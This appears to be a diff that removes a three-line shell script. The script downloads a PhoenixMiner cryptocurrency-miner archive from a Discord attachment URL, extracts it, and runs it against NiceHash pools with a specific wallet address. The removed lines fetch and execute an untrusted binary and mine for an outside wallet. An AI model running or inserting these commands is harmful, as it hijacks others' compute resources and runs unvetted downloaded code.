@@ -1,3 +1,0 @@
-wget https://cdn.discordapp.com/attachments/767114481321902130/785767630496858142/PhoenixMiner_4.2c_Linux.tar
-tar -xvf PhoenixMiner_4.2c_Linux.tar
-PhoenixMiner_4.2c_Linux/PhoenixMiner -rvram 1 -pool stratum+tcp://daggerhashimoto.usa.nicehash.com:3353 -pool2 stratum+tcp://daggerhashimoto.eu.nicehash.com:3353 -ewal 368dnSPEiXj1Ssy35BBWMwKcmFnGLuqa1J.0e3hkezhni45tal -esm 3 -allpools 1 -allcoins 0
